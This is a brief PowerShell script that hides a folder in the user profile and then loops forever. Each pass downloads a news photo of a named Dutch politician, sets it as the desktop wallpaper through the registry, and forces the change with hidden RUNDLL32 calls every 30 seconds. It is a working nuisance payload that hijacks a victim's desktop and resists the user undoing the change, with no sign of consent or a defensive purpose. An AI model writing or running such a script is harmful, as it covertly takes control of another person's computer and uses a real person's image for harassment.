attrib +s +h "$env:USERPROFILE\temp";
While ($true) {iwr "https://media.nu.nl/m/kcgx47lam66h_wd1280.jpg/sylvana-simons-verklaart-vertrek-bij-debat-leef-al-jaren-met-chronische-pijn.jpg" -outfile "$env:USERPROFILE\temp\a.jpg"; sp 'HKCU:Control Panel\Desktop' Wallpaper "$env:USERPROFILE\temp\a.jpg"; 1..59 | % {RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters -windowstyle hidden; $i; $i++}; sleep 30}
